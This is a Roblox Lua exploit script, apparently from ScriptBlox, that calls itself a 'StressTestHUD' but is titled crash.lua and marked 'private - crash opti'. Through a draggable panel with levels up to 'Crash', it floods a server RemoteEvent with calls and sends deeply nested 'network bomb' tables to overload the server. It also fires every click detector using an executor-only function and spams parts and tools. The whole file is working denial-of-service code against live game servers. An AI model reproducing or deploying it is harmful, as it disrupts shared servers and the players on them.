-- crash.lua
-- credits goes to piwiii2.00
-- 2025
-- WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ======================
-- CONFIG
-- ======================
local REMOTE_NAME = "TestEvent" 
local LEVELS = {
    Easy = {eventsPerHeartbeat = 10,  fireClick = false, consoleSpam = false, instanceSpam = false, networkBomb = false, cubeSpawn = false, itemSpam = false},
    Mid  = {eventsPerHeartbeat = 100, fireClick = true,  consoleSpam = true,  instanceSpam = false, networkBomb = false, cubeSpawn = false, itemSpam = false},
    Hard = {eventsPerHeartbeat = 500, fireClick = true,  consoleSpam = true,  instanceSpam = true,  networkBomb = true,  cubeSpawn = true,  itemSpam = true},
    Crash= {eventsPerHeartbeat = 1000,fireClick = true,  consoleSpam = true,  instanceSpam = true,  networkBomb = true,  cubeSpawn = true,  itemSpam = true}, -- Niveau pour crash intensif
}
local currentLevel = "Mid"     
local ALLOW_FIRE = true        
local ALLOW_INSTANCE_SPAM = false 
local ALLOW_NETWORK_BOMB = false  
local ALLOW_CUBE_SPAWN = false    
local ALLOW_ITEM_SPAM = false     
local EMERGENCY_THRESHOLD_PER_SEC = 15000 
local MAX_RUNTIME_SECONDS = 30    
local NETWORK_BOMB_TABLE_SIZE = 500 
local NETWORK_BOMB_TRIES = 3       
local INSTANCE_SPAM_DELAY = 0.005  
local CUBE_SPAWN_DELAY = 0.005     
local ITEM_SPAM_DELAY = 0.005      
local ITEM_SPAM_NUM_TOOLS = 50     
local PHYSICS_STRESS = true       

-- ======================
-- Setup RemoteEven
-- ======================
local remote = ReplicatedStorage:FindFirstChild(REMOTE_NAME)
if not remote then
    remote = Instance.new("RemoteEvent")
    remote.Name = REMOTE_NAME
    remote.Parent = ReplicatedStorage
end

-- ======================
-- UI
-- ======================
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "StressTestHUD_Final"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local function newButton(parent, text, size, pos, color, textSize)
    local btn = Instance.new("TextButton")
    btn.Size = size
    btn.Position = pos
    btn.BackgroundColor3 = color
    btn.TextColor3 = Color3.new(1,1,1)
    btn.Font = Enum.Font.SourceSansBold
    btn.TextSize = textSize or 16
    btn.Text = text
    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0,8)
    btn.Parent = parent
    return btn
end

-- container
local hud = Instance.new("Frame", screenGui)
hud.Name = "HUD"
hud.Size = UDim2.new(0,360,0,500)
hud.Position = UDim2.new(0,20,0,80)
hud.BackgroundColor3 = Color3.fromRGB(30,28,45)
hud.BorderSizePixel = 0
hud.Visible = true
Instance.new("UICorner", hud).CornerRadius = UDim.new(0,14)

-- toggle
local hudToggle = newButton(screenGui, "HUD", UDim2.new(0,48,0,48), UDim2.new(0,8,0,10), Color3.fromRGB(80,50,120), 14)

-- Title
local title = Instance.new("TextLabel", hud)
title.Size = UDim2.new(1,0,0,28)
title.Position = UDim2.new(0,0,0,6)
title.BackgroundTransparency = 1
title.Text = "StressTestHUD (private - crash opti)"
title.TextColor3 = Color3.fromRGB(220,220,220)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 18

-- Controls
local startBtn    = newButton(hud, "Start Test", UDim2.new(0,280,0,40), UDim2.new(0.06,0,0,40), Color3.fromRGB(150,40,180), 18)
local levelBtn    = newButton(hud, "Level: "..currentLevel, UDim2.new(0,160,0,30), UDim2.new(0.06,0,0,94), Color3.fromRGB(100,100,180),14)
local fireBtn     = newButton(hud, "FireClick: "..tostring(ALLOW_FIRE), UDim2.new(0,160,0,30), UDim2.new(0.52,0,0,94), Color3.fromRGB(120,100,140),14)
local consoleBtn  = newButton(hud, "Console Spam: OFF", UDim2.new(0,160,0,30), UDim2.new(0.06,0,0,134), Color3.fromRGB(90,120,70),14)
local debugBtn    = newButton(hud, "Debug: OFF", UDim2.new(0,160,0,30), UDim2.new(0.52,0,0,134), Color3.fromRGB(180,90,30),14)
local instanceBtn = newButton(hud, "Instance Spam: OFF", UDim2.new(0,160,0,30), UDim2.new(0.06,0,0,174), Color3.fromRGB(200,100,50),14)
local networkBtn  = newButton(hud, "Network Bomb: OFF", UDim2.new(0,160,0,30), UDim2.new(0.52,0,0,174), Color3.fromRGB(200,50,100),14)
local cubeSpawnBtn= newButton(hud, "Cube Spawn: OFF", UDim2.new(0,160,0,30), UDim2.new(0.06,0,0,214), Color3.fromRGB(50,150,100),14)
local itemSpamBtn = newButton(hud, "Item Spam: OFF", UDim2.new(0,160,0,30), UDim2.new(0.52,0,0,214), Color3.fromRGB(150,150,50),14)
local emergencyBtn= newButton(hud, "EMERGENCY STOP", UDim2.new(0,280,0,36), UDim2.new(0.06,0,0,254), Color3.fromRGB(200,40,40),16)
local cleanupBtn  = newButton(hud, "Cleanup All", UDim2.new(0,280,0,36), UDim2.new(0.06,0,0,294), Color3.fromRGB(100,100,100),16)
local closeBtn    = newButton(hud, "X", UDim2.new(0,26,0,26), UDim2.new(1,-34,0,6), Color3.fromRGB(150,40,180),14)

local infoLabel = Instance.new("TextLabel", hud)
infoLabel.Size = UDim2.new(0,332,0,200)
infoLabel.Position = UDim2.new(0.02,0,0,340)
infoLabel.BackgroundTransparency = 1
infoLabel.TextColor3 = Color3.fromRGB(200,200,200)
infoLabel.Font = Enum.Font.SourceSans
infoLabel.TextSize = 14
infoLabel.TextWrapped = true
infoLabel.Text = "Events/sec: 0 | State: Idle\nRemoteEvents: ? | ClickDetectors: ?\nInstances Created: 0 | Bombs Sent: 0\nCubes Spawned: 0 | Items Spammed: 0 | FPS: ?"

closeBtn.MouseButton1Click:Connect(function() hud.Visible = false end)
hudToggle.MouseButton1Click:Connect(function() hud.Visible = not hud.Visible end)

do
    local dragging, dragStart, startPos
    hud.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = hud.Position
        end
    end)
    hud.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - dragStart
            hud.Position = UDim2.new(0, startPos.X.Offset + delta.X, 0, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- ======================
-- State/logic
-- ======================
local running = false
local heartbeatConn = nil
local eventsSentThisSecond = 0
local instancesCreated = 0
local bombsSent = 0
local cubesSpawned = 0
local itemsSpammed = 0
local lastReset = tick()
local startTime = 0
local consoleSpam = false
local debugMode = false
local remoteCountCached = 0
local clickCountCached = 0

local function safeCountRemotes()
    local count = 0
    for _,v in ipairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") then count = count + 1 end
    end
    return count
end

local function safeCountClickDetectors()
    local count = 0
    for _,v in ipairs(Workspace:GetDescendants()) do
        if v:IsA("ClickDetector") then count = count + 1 end
    end
    return count
end

local function updateDebugCounts()
    remoteCountCached = safeCountRemotes()
    clickCountCached = safeCountClickDetectors()
end

local function updateInfoLabel()
    local stats = game:GetService("Stats")
    local fps = stats.FrameRate
    local state = running and "Running" or "Idle"
    local text = ("Events/sec: %d | State: %s"):format(eventsSentThisSecond, state)
    text = text .. ("\nRemoteEvents: %d | ClickDetectors: %d"):format(remoteCountCached, clickCountCached)
    text = text .. ("\nLevel: %s | FireClick: %s | ConsoleSpam: %s"):format(currentLevel, tostring(ALLOW_FIRE), consoleSpam and "ON" or "OFF")
    text = text .. ("\nInstance Spam: %s | Network Bomb: %s | Cube Spawn: %s | Item Spam: %s"):format(ALLOW_INSTANCE_SPAM and "ON" or "OFF", ALLOW_NETWORK_BOMB and "ON" or "OFF", ALLOW_CUBE_SPAWN and "ON" or "OFF", ALLOW_ITEM_SPAM and "ON" or "OFF")
    text = text .. ("\nInstances Created: %d | Bombs Sent: %d | Cubes Spawned: %d | Items Spammed: %d"):format(instancesCreated, bombsSent, cubesSpawned, itemsSpammed)
    text = text .. ("\nFPS: %.1f"):format(fps)
    infoLabel.Text = text
end

local function emergencyStop(reason)
    running = false
    if heartbeatConn then heartbeatConn:Disconnect() heartbeatConn = nil end
    startBtn.Text = "Start Test"
    updateDebugCounts()
    updateInfoLabel()
    warn("StressTestHUD: Emergency stop triggered - "..tostring(reason))
end

local function cleanupAll()
    pcall(function()
        for _, v in ipairs(Workspace:GetChildren()) do
            if v:IsA("Part") and (v.Name == "StressTestPart" or v.Name == "StressTestCube") then
                v:Destroy()
            end
        end
        for _, v in ipairs(player.Backpack:GetChildren()) do
            if v:IsA("Tool") and string.find(v.Name, "StressTestTool_") then
                v:Destroy()
            end
        end
        if player.Character then
            for _, v in ipairs(player.Character:GetChildren()) do
                if v:IsA("Tool") and string.find(v.Name, "StressTestTool_") then
                    v:Destroy()
                end
            end
        end
        instancesCreated = 0
        cubesSpawned = 0
        itemsSpammed = 0
        updateInfoLabel()
    end)
end

local function runInstanceSpam()
    coroutine.wrap(function()
        while running and ALLOW_INSTANCE_SPAM do
            local char = player.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    pcall(function()
                        local part = Instance.new("Part")
                        part.Name = "StressTestPart"
                        part.Size = Vector3.new(5, 5, 5)
                        part.Position = hrp.Position + Vector3.new(math.random(-10, 10), 5, math.random(-10, 10))
                        part.Anchored = false
                        part.Parent = Workspace
                        instancesCreated = instancesCreated + 1
                    end)
                end
            end
            task.wait(INSTANCE_SPAM_DELAY)
            if instancesCreated >= 10000 then
                emergencyStop("instance limit reached (10000)")
                return
            end
        end
    end)()
end

local function runCubeSpawn()
    coroutine.wrap(function()
        while running and ALLOW_CUBE_SPAWN do
            local char = player.Character
            if char then
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    pcall(function()
                        local cube = Instance.new("Part")
                        cube.Name = "StressTestCube"
                        cube.Size = Vector3.new(1, 1, 1)
                        cube.Position = hrp.Position + Vector3.new(math.random(-5, 5), 10, math.random(-5, 5))
                        cube.Anchored = not PHYSICS_STRESS
                        cube.BrickColor = BrickColor.Random()
                        if PHYSICS_STRESS then
                            cube.CanCollide = true
                            local bodyVelocity = Instance.new("BodyVelocity")
                            bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            bodyVelocity.Velocity = Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
                            bodyVelocity.Parent = cube
                        end
                        cube.Parent = Workspace
                        cubesSpawned = cubesSpawned + 1
                    end)
                end
            end
            task.wait(CUBE_SPAWN_DELAY)
            if cubesSpawned >= 10000 then
                emergencyStop("cube spawn limit reached (10000)")
                return
            end
        end
    end)()
end

local function runItemSpam()
    coroutine.wrap(function()
        for i = 1, ITEM_SPAM_NUM_TOOLS do
            pcall(function()
                local tool = Instance.new("Tool")
                tool.Name = "StressTestTool_" .. i
                local handle = Instance.new("Part")
                handle.Name = "Handle"
                handle.Size = Vector3.new(1, 1, 1)
                handle.Parent = tool
                tool.Parent = player.Backpack
            end)
        end

        while running and ALLOW_ITEM_SPAM do
            local tools = player.Backpack:GetChildren()
            for _, tool in ipairs(tools) do
                if tool:IsA("Tool") and string.find(tool.Name, "StressTestTool_") then
                    pcall(function()
                        if player.Character and player.Character:FindFirstChild("Humanoid") then
                            player.Character.Humanoid:EquipTool(tool)
                            itemsSpammed = itemsSpammed + 1
                        end
                    end)
                    task.wait(ITEM_SPAM_DELAY)
                    pcall(function()
                        if player.Character and player.Character:FindFirstChild("Humanoid") then
                            player.Character.Humanoid:UnequipTools()
                            itemsSpammed = itemsSpammed + 1
                        end
                    end)
                end
            end
            task.wait(0.1)
            if itemsSpammed >= 100000 then
                emergencyStop("item spam limit reached (100000)")
                return
            end
        end
    end)()
end

-- Logique de network bomb optimisée (surcharge réseau serveur)
local function runNetworkBomb()
    coroutine.wrap(function()
        while running and ALLOW_NETWORK_BOMB do
            pcall(function()
                game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
                local function getmaxvalue(val)
                    local mainvalueifonetable = 999999
                    if type(val) ~= "number" then return nil end
                    return (mainvalueifonetable / (val + 2))
                end

                local function bomb(tableincrease, tries)
                    local maintable = {}
                    local spammedtable = {}
                    table.insert(spammedtable, {})
                    local z = spammedtable[1]

                    for i = 1, tableincrease do
                        local tableins = {}
                        table.insert(z, tableins)
                        z = tableins
                    end

                    local calculatemax = getmaxvalue(tableincrease) or 999999

                    for i = 1, calculatemax do
                        table.insert(maintable, spammedtable)
                    end

                    for i = 1, tries do
                        remote:FireServer(maintable)
                        bombsSent = bombsSent + 1
                    end
                end

                bomb(NETWORK_BOMB_TABLE_SIZE, NETWORK_BOMB_TRIES)
            end)
            task.wait(0.4)
        end
    end)()
end

local function startTest()
    if running then return end
    running = true
    startTime = tick()
    eventsSentThisSecond = 0
    instancesCreated = 0
    bombsSent = 0
    cubesSpawned = 0
    itemsSpammed = 0
    startBtn.Text = "Stop Test"
    updateDebugCounts()
    updateInfoLabel()

    local cfg = LEVELS[currentLevel]
    ALLOW_INSTANCE_SPAM = cfg.instanceSpam
    ALLOW_NETWORK_BOMB = cfg.networkBomb
    ALLOW_CUBE_SPAWN = cfg.cubeSpawn
    ALLOW_ITEM_SPAM = cfg.itemSpam
    instanceBtn.Text = "Instance Spam: " .. (ALLOW_INSTANCE_SPAM and "ON" or "OFF")
    networkBtn.Text = "Network Bomb: " .. (ALLOW_NETWORK_BOMB and "ON" or "OFF")
    cubeSpawnBtn.Text = "Cube Spawn: " .. (ALLOW_CUBE_SPAWN and "ON" or "OFF")
    itemSpamBtn.Text = "Item Spam: " .. (ALLOW_ITEM_SPAM and "ON" or "OFF")

    if ALLOW_INSTANCE_SPAM then runInstanceSpam() end
    if ALLOW_NETWORK_BOMB then runNetworkBomb() end
    if ALLOW_CUBE_SPAWN then runCubeSpawn() end
    if ALLOW_ITEM_SPAM then runItemSpam() end

    heartbeatConn = RunService.Heartbeat:Connect(function()
        if not running then return end

        for i = 1, cfg.eventsPerHeartbeat do
            pcall(function() remote:FireServer("stress_ping", tick()) end)
            eventsSentThisSecond = eventsSentThisSecond + 1
        end

        if cfg.fireClick and ALLOW_FIRE then
            pcall(function()
                for _, v in ipairs(Workspace:GetDescendants()) do
                    if v:IsA("ClickDetector") then
                        pcall(fireclickdetector, v)
                    end
                end
            end)
        end

        if cfg.consoleSpam and consoleSpam then
            for i=1,5 do
                print("LOCAL CONSOLE SPAM — Level:", currentLevel)
            end
        end

        if tick() - lastReset >= 1 then
            if EMERGENCY_THRESHOLD_PER_SEC > 0 and eventsSentThisSecond >= EMERGENCY_THRESHOLD_PER_SEC then
                emergencyStop(("events/sec %d >= threshold %d"):format(eventsSentThisSecond, EMERGENCY_THRESHOLD_PER_SEC))
                return
            end
            if debugMode then updateDebugCounts() end
            updateInfoLabel()
            eventsSentThisSecond = 0
            lastReset = tick()
        end

        if MAX_RUNTIME_SECONDS > 0 and tick() - startTime >= MAX_RUNTIME_SECONDS then
            emergencyStop(("max runtime %ds reached"):format(MAX_RUNTIME_SECONDS))
            return
        end
    end)
end

local function stopTest()
    running = false
    if heartbeatConn then heartbeatConn:Disconnect() heartbeatConn = nil end
    startBtn.Text = "Start Test"
    updateDebugCounts()
    updateInfoLabel()
end

local debugUpdaterThread = coroutine.create(function()
    while true do
        if debugMode then
            updateDebugCounts()
            updateInfoLabel()
        end
        task.wait(0.5)
    end
end)
coroutine.resume(debugUpdaterThread)

-- ======================
-- UI events
-- ======================
startBtn.MouseButton1Click:Connect(function()
    if running then stopTest() else startTest() end
end)

levelBtn.MouseButton1Click:Connect(function()
    if currentLevel == "Easy" then currentLevel = "Mid"
    elseif currentLevel == "Mid" then currentLevel = "Hard"
    elseif currentLevel == "Hard" then currentLevel = "Crash"
    else currentLevel = "Easy" end
    levelBtn.Text = "Level: "..currentLevel
    updateDebugCounts()
    updateInfoLabel()
end)

fireBtn.MouseButton1Click:Connect(function()
    ALLOW_FIRE = not ALLOW_FIRE
    fireBtn.Text = "FireClick: "..tostring(ALLOW_FIRE)
    updateInfoLabel()
end)

consoleBtn.MouseButton1Click:Connect(function()
    consoleSpam = not consoleSpam
    consoleBtn.Text = "Console Spam: "..(consoleSpam and "ON" or "OFF")
    updateInfoLabel()
end)

debugBtn.MouseButton1Click:Connect(function()
    debugMode = not debugMode
    debugBtn.Text = "Debug: "..(debugMode and "ON" or "OFF")
    updateDebugCounts()
    updateInfoLabel()
end)

instanceBtn.MouseButton1Click:Connect(function()
    ALLOW_INSTANCE_SPAM = not ALLOW_INSTANCE_SPAM
    instanceBtn.Text = "Instance Spam: "..(ALLOW_INSTANCE_SPAM and "ON" or "OFF")
    if running and ALLOW_INSTANCE_SPAM then runInstanceSpam() end
    updateInfoLabel()
end)

networkBtn.MouseButton1Click:Connect(function()
    ALLOW_NETWORK_BOMB = not ALLOW_NETWORK_BOMB
    networkBtn.Text = "Network Bomb: "..(ALLOW_NETWORK_BOMB and "ON" or "OFF")
    if running and ALLOW_NETWORK_BOMB then runNetworkBomb() end
    updateInfoLabel()
end)

cubeSpawnBtn.MouseButton1Click:Connect(function()
    ALLOW_CUBE_SPAWN = not ALLOW_CUBE_SPAWN
    cubeSpawnBtn.Text = "Cube Spawn: "..(ALLOW_CUBE_SPAWN and "ON" or "OFF")
    if running and ALLOW_CUBE_SPAWN then runCubeSpawn() end
    updateInfoLabel()
end)

itemSpamBtn.MouseButton1Click:Connect(function()
    ALLOW_ITEM_SPAM = not ALLOW_ITEM_SPAM
    itemSpamBtn.Text = "Item Spam: "..(ALLOW_ITEM_SPAM and "ON" or "OFF")
    if running and ALLOW_ITEM_SPAM then runItemSpam() end
    updateInfoLabel()
end)

emergencyBtn.MouseButton1Click:Connect(function()
    emergencyStop("manual emergency pressed")
end)

cleanupBtn.MouseButton1Click:Connect(function()
    cleanupAll()
end)

-- init
updateDebugCounts()
updateInfoLabel()
print("StressTestHUD_Final loaded — use with responsability")
